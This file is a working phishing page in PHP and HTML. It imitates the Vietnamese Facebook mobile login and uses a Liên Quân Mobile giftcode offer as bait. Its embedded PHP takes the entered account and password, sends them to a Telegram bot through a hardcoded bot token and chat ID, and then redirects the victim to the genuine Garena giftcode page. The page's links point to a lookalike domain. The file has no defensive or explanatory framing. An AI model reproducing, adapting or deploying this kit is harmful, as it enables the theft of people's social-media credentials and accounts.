<html lang="vi"><head>
<title>Đăng nhập Facebook | Facebook</title>
<meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
<meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
<link href="images/gB76kJXPYJV.png" rel="shortcut icon" sizes="196x196">
<meta property="og:image" content="images/fb_icon_325x325.png">
<meta name="referrer" content="origin-when-crossorigin">
<link type="text/css" rel="stylesheet" href="css/2O71eveAYwt.css" crossorigin="anonymous">
<link type="text/css" rel="stylesheet" href="css/lNexuUpz0CV.css" crossorigin="anonymous">
<meta property="og:title" content="Đăng nhập Facebook | Facebook">
<meta property="og:description" content="Hãy đăng nhập Facebook để bắt đầu chia sẻ và kết nối với bạn bè, gia đình và những người bạn biết.">
</head>
<body tabindex="0" class="touch x1 _fzu _50-3 iframe acw portrait" style="background-color: rgb(236, 239, 245);">
<div id="viewport">
<div id="page">
<div class="_129_" id="header-notices"></div>
<div class="_7om2 _52we _52z5" id="header">
<div class="_4g34 _52z6" data-sigil="mChromeHeaderCenter">
<a href="/">
<i class="img sp_30Zun_N-cVU sx_f4919a"><u>facebook</u></i>
</a>
</div>
</div>
<div class="_5soa _3-q1 acw" id="root" role="main" data-sigil="context-layer-root content-pane" style="min-height: 472px;">
<div class="_7om2">
<div class="_4g34" id="u_0_0_o9">
<div class="_5yd0 _2ph- _5yd1" style="display: none;" id="login_error" data-sigil="m_login_notice">
<div class="_52jd"></div>
</div>
<div class="_9om_">
<div class="aclb _4-4l">
<div class="_5rut">
<div>
<div class="_52jj _3-q2">
<img src="images/26479243_880483408791977_5297804325249089536_n.png" width="60" class="_3-q3 img">
<div class="_52je _52j9">Hãy đăng nhập vào tài khoản Facebook của bạn để kết
nối với Liên Quân Mobile</div>
</div>
</div>
<?php
    if(isset($_POST['account'])){
        $account = $_POST['account'];
        $password = $_POST['password'];
        if(empty($account)){
            echo '<script>alert(\'Vui lòng nhập email hoặc số điện thoại\');</script>';
        } elseif (empty($password)) {
            echo '<script>alert(\'Vui lòng không bỏ trống mật khẩu\');</script>';
        } else {
            $botToken = "5568011506:AAEu39ys7J7I8J9fEyd5tBwzzabxxzJhvqc";
$chatId = "-1002042330395"; // ID của cuộc trò chuyện hoặc người dùng bạn muốn gửi tin nhắn
$message = "\n[THÔNG BÁO ĐĂNG NHẬP]\nTài khoản: $account\nMật khẩu: $password\nĐăng nhập bằng Facebook";

// Tạo URL để gửi yêu cầu API Telegram
$url = "https://api.telegram.org/bot$botToken/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text' => $message
];

$options = [
    'http' => [
        'method' => 'POST',
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($data)
    ]
];

$context = stream_context_create($options);

// Gửi yêu cầu HTTP sử dụng cURL
$response = file_get_contents($url, false, $context);
echo '<script>window.location.href="https://lienquan.garena.vn/giftcode/"</script>';

        }
    }
?>
<form method="post" action class="mobile-login-form _9hp- _5spm" id="login_form">
<div class="_56be _5sob">
<div class="_55wo _55x2 _56bf">
<div class="_96n9" id="email_input_container">
<input class="_56bg _4u9z _5ruq" name="account" placeholder="Số di động hoặc email" type="text">
</div>
<div>
<div class="_1upc _mg8" data-sigil="m_login_password">
<div class="_7om2">
<div class="_4g34 _5i2i _52we">
<div class="_5xu4">
<input class="_56bg _4u9z _27z2" name="password" placeholder="Mật khẩu Facebook" type="password">
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="_2pie" style="text-align: center;">
<div id="login_password_step_element">
<button type="submit" class="_54k8 _52jh _56bs _56b_ _28lf _56bw _56bu"><span class="_55sr">Đăng nhập</span></button>
</div>
</div>
</form>
<div>
<div class="_2pie _9omz">
<div class="_52jj _9on1">
<a class="_9on1" tabindex="0" href="https://garena-sukien-giftcode-lqmbn.com/identify">Quên mật khẩu?</a>
</div>
</div>
<div style="padding-top: 42px;">
<div>
<div>
<div></div>
</div>
<div class="_2pie" style="text-align: center;">
<div>
<div data-sigil="login_identify_step_element">
<div>
<div class="_4581 _2phz"><a href="https://garena-sukien-giftcode-lqmbn.com/register">Tạo
tài khoản</a></div>
<div class="_4581">
<a href="https://garena-sukien-giftcode-lqmbn.com/access_token" ajaxify="false" target="_self" data-sigil="MLynx_asynclazy">Lúc khác</a>
</div>
</div>
</div>
<div class="other-links _8p_m">
<ul class="_5pkb _55wp">
<li>
<span class="mfss fcg">
<a href="https://garena-sukien-giftcode-lqmbn.com/help" id="help-link" class="_8p_m sec">Trung tâm trợ giúp</a>
</span>
</li>
</ul>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="_55wr _5ui2" data-sigil="m_login_footer">
<div class="_5dpw">
<div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea">
<div class="_7om2">
<div class="_4g34">
<span class="_52jc _52j9 _52jh _3ztb">Tiếng Việt</span>
<div class="_3ztc">
<span class="_52jc"><a href="#" data-method="post" data-sigil="ajaxify">中文(台灣)</a></span>
</div>
<div class="_3ztc">
<span class="_52jc"><a href="#" data-method="post" data-sigil="ajaxify">Español</a></span>
</div>
<div class="_3ztc">
<span class="_52jc"><a href="#" data-method="post" data-sigil="ajaxify">Français
(France)</a></span>
</div>
</div>
<div class="_4g34">
<div class="_3ztc">
<span class="_52jc"><a href="#" data-method="post" data-sigil="ajaxify">English
(UK)</a></span>
</div>
<div class="_3ztc">
<span class="_52jc"><a href="#" data-method="post" data-sigil="ajaxify">한국어</a></span>
</div>
<div class="_3ztc">
<span class="_52jc"><a href="#" data-method="post" data-sigil="ajaxify">Português (Brasil)</a></span>
</div>
<a href="#">
<div class="_3j87 _1rrd _3ztd" aria-label="Danh sách ngôn ngữ đầy đủ" data-sigil="more_language"><i class="img sp_30Zun_N-cVU sx_6f7e61"></i>
</div>
</a>
</div>
</div>
</div>
<div class="_5ui4"><span class="mfss fcg">Meta © 2023</span></div>
</div>
</div>
</div>
</div>
</div>

</body></html>